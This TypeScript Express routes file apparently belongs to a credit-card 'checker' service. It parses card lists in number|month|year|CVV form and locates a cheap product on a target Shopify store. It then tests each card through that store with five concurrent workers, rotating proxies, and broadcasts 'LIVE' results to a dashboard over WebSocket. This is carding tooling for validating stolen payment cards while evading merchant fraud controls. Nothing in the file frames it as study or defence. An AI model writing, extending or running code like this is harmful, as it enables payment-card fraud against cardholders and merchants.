import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { WS_EVENTS } from "@shared/schema";
import { z } from "zod";
import { ShopifyChecker } from "./services/shopify";
import { results } from "@shared/schema";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  // === WebSocket Setup ===
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });

  // Broadcast helper
  const broadcast = (data: any) => {
    const payload = JSON.stringify(data);
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    });
  };

  // === Job Management ===
  let isRunning = false;
  let shouldStop = false;

  const processQueue = async (cards: string[], targetUrl: string, proxyListStr: string) => {
    isRunning = true;
    shouldStop = false;

    // Parse proxies
    const proxies = proxyListStr.split('\n')
      .map(p => p.trim())
      .filter(p => p.length > 0)
      .map(p => {
         // Naive parsing, assumes http://user:pass@host:port or host:port:user:pass formats if needed
         // For now, assume standard URL format or user provides just host:port
         if (!p.startsWith('http')) return `http://${p}`;
         return p;
      });

    // Find product (once)
    let product;
    try {
        broadcast({ type: WS_EVENTS.LOG, data: { message: `Scanning ${targetUrl} for products...`, type: 'info' } });
        // Use first proxy or direct if none
        const checker = new ShopifyChecker(proxies.length > 0 ? { url: proxies[0] } : undefined);
        product = await checker.findCheapProduct(targetUrl);
        broadcast({ type: WS_EVENTS.LOG, data: { message: `Found product: ${product.title} ($${product.price})`, type: 'success' } });
    } catch (e: any) {
        broadcast({ type: WS_EVENTS.LOG, data: { message: `Failed to find product: ${e.message}`, type: 'error' } });
        isRunning = false;
        return;
    }

    let processedCount = 0;
    const total = cards.length;

    // Concurrency limit
    const CONCURRENCY = 5;
    const queue = [...cards];
    const activePromises: Promise<void>[] = [];

    const worker = async () => {
        while (queue.length > 0 && !shouldStop) {
            const cardStr = queue.shift();
            if (!cardStr) break;

            const parts = cardStr.split('|');
            if (parts.length < 4) {
                 broadcast({ type: WS_EVENTS.LOG, data: { message: `Invalid format: ${cardStr}`, type: 'error' } });
                 processedCount++;
                 continue;
            }

            const card = { cc: parts[0], month: parts[1], year: parts[2], cvv: parts[3] };
            
            // Rotate proxy
            const proxyUrl = proxies.length > 0 ? proxies[processedCount % proxies.length] : undefined;
            const checker = new ShopifyChecker(proxyUrl ? { url: proxyUrl } : undefined);

            try {
                const result = await checker.checkCard(targetUrl, product, card);
                
                // Save & Broadcast
                const saved = await storage.addResult({
                    card: cardStr,
                    status: result.status,
                    message: result.message
                });

                broadcast({ type: WS_EVENTS.RESULT, data: saved });
                
                if (result.status === 'live') {
                     broadcast({ type: WS_EVENTS.LOG, data: { message: `LIVE: ${card.cc.substring(0,4)}...`, type: 'success' } });
                }

            } catch (e: any) {
                 broadcast({ type: WS_EVENTS.LOG, data: { message: `Error checking ${card.cc}: ${e.message}`, type: 'error' } });
            }

            processedCount++;
            broadcast({ type: WS_EVENTS.STATUS_UPDATE, data: { active: true, processed: processedCount, total } });
        }
    };

    // Start workers
    for (let i = 0; i < CONCURRENCY; i++) {
        activePromises.push(worker());
    }

    await Promise.all(activePromises);
    
    isRunning = false;
    broadcast({ type: WS_EVENTS.STATUS_UPDATE, data: { active: false, processed: processedCount, total } });
    broadcast({ type: WS_EVENTS.LOG, data: { message: 'Job finished', type: 'info' } });
  };

  // === API Routes ===

  app.get(api.settings.get.path, async (req, res) => {
    const config = await storage.getSettings();
    if (!config) {
      // Return default
      return res.json({ targetUrl: '', proxyList: '', proxyEnabled: true });
    }
    res.json(config);
  });

  app.post(api.settings.update.path, async (req, res) => {
    try {
      const input = api.settings.update.input.parse(req.body);
      const updated = await storage.updateSettings(input);
      res.json(updated);
    } catch (e) {
      res.status(400).json({ message: 'Invalid settings' });
    }
  });

  app.post(api.check.start.path, async (req, res) => {
    if (isRunning) return res.status(400).json({ message: 'Job already running' });
    
    const { cards } = req.body;
    const settings = await storage.getSettings();
    
    if (!settings || !settings.targetUrl) {
        return res.status(400).json({ message: 'Target URL not configured' });
    }

    // Start background process
    processQueue(cards, settings.targetUrl, settings.proxyList || '');
    
    res.json({ message: 'Job started', jobId: '1' });
  });

  app.post(api.check.stop.path, (req, res) => {
    shouldStop = true;
    res.json({ message: 'Stopping...' });
  });

  app.post(api.check.clear.path, async (req, res) => {
    await storage.clearResults();
    res.json({ message: 'Cleared' });
  });
  
  // Results endpoint to load initial state
  app.get('/api/results', async (req, res) => {
    const data = await storage.getResults(200);
    res.json(data);
  });

  return httpServer;
}
